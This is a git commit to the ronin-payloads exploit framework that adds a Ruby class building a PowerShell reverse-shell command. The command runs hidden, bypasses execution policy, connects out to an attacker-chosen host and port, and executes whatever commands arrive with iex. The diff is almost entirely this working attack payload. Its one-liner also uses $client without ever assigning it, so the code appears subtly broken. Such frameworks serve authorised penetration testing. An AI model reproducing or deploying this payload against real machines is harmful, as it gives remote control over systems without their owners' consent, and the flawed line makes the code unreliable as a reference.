b960b22b9fda1aabd85f932bac705d7ba7ce81c1
Postmodern <postmodern.mod3@gmail.com>
2022-12-07 20:33:41 -0800

    Added `Ronin::Payloads::Builtin::CMD::PowerShell::ReverseShell` (#37).

---
+++ lib/ronin/payloads/builtin/cmd/powershell/reverse_shell.rb
@@ -0,0 +1,48 @@
+#
+# ronin-payloads - A Ruby micro-framework for writing and running exploit
+# payloads.
+#
+# Copyright (c) 2007-2022 Hal Brodigan (postmodern.mod3 at gmail.com)
+#
+# ronin-payloads is free software: you can redistribute it and/or modify
+# it under the terms of the GNU Lesser General Public License as published
+# by the Free Software Foundation, either version 3 of the License, or
+# (at your option) any later version.
+#
+# ronin-payloads is distributed in the hope that it will be useful,
+# but WITHOUT ANY WARRANTY; without even the implied warranty of
+# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+# GNU Lesser General Public License for more details.
+#
+# You should have received a copy of the GNU Lesser General Public License
+# along with ronin-payloads.  If not, see <https://www.gnu.org/licenses/>.
+#
+
+require 'ronin/payloads/command_payload'
+require 'ronin/payloads/mixins/reverse_shell'
+
+module Ronin
+  module Payloads
+    module CMD
+      module PowerShell
+        #
+        # A basic `powershell` reverse shell command.
+        #
+        class ReverseShell < CommandPayload
+
+          include Mixins::ReverseShell
+
+          register 'cmd/powershell/reverse_shell'
+
+          #
+          # Builds the `powershell` reverse shell command.
+          #
+          def build
+            @payload = %{powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(#{host.dump},#{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()}
+          end
+
+        end
+      end
+    end
+  end
+end
